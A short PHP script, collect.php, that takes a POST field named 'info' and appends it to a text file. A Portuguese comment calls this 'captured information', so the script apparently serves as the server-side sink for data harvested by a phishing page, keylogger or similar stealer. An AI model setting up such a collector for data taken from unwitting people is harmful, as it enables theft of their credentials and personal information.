<!-- collect.php -->
<?php
if (isset($_POST['info'])) {
    $info = urldecode($_POST['info']);
    // Faça o que desejar com as informações capturadas, como salvar em um arquivo
    file_put_contents('informacoes.txt', $info . "\n", FILE_APPEND);
}
?>
